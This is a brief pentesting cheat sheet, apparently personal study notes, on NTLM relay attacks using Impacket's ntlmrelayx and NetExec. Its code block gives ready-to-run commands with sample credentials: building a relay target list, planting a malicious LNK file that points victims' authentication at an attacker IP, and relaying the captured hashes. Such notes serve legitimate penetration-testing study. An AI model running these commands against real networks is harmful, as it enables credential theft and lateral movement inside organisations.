---
title:  ntlmrelayx - a module from Impacket
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - smb
---



## Installation 

Download from: [https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)




## NTLM relay with impacket

```
# Check if vulnerable
nxc smb 192.168.245.172-174 -u 'Eric.Wallows' -p 'EricLikesRunning800' --gen-relay-list IPs/allIPs.txt 

# Alternative 1:Run the slinky tool to generate lnk malicious file, get it executed and dump
nxc smb 192.168.245.173 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M slinky -o SERVER=192.168.45.182 NAME=README

# Alternative 2: Also if you want to set a server with impacket:
impacket-ntlmrelayx --no-http-server -smb2support -tf IPs/allIPs.txt 


```